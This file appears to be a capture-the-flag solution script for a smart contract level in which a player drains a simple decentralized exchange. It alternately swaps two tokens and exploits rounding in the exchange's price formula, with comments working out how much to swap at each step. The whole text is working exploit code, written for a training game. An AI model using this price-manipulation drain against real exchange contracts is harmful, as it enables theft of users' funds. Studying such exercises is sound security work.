/* 
Tools needed for this level:
- Console
*/

// 1.- Declare variables of tokens' addresses.
tk1 = await contract.token1();
tk2 = await contract.token2();

// 2.- Approve enough tokens for DEX contract address to swap
await contract.approve(instance, 200);

// 3.- Swap tokens back and forth:

/*
The received amount if swap 10 token1 to token2:
(10 * 100) / 100 = 10 token2

Received amount if swap 20 token2 to token1:
(20 * 110) / 90 ~ 24.444 = 24 token1 (round down)

If we notice the received amount on step 2, more token is obtained.

We cannot swap 65 token2 to 158** token1 since token1 is not enough as of the current price. The contract currently has 110 token1 and 45 token2.
** 65 * (110/45) = 158

If we need to drain all 110 token1, the amount of token2 to be swapped is:
(65 * 110) / 158 = 45
Swap 45 token2 to 110 token1 as shown in Listing 5.
*/

await contract.swap(tk1, tk2, 10);
await contract.swap(tk2, tk1, 20);
await contract.swap(tk1, tk2, 24);
await contract.swap(tk2, tk1, 30);
await contract.swap(tk1, tk2, 41);
await contract.swap(tk2, tk1, 45);

String(await contract.balanceOf(tk1, instance));
String(await contract.balanceOf(tk2, instance));

String(await contract.get_swap_price(tk2, tk1, 20));

String(await contract.balanceOf(tk1, player));
String(await contract.balanceOf(tk2, player));

// ------Get token balances of DEX contract address--------------
// ------Helper for viewing the obtainable tokens in each swap----
// ------Helper for reviewing DEX contract's tokens balance----
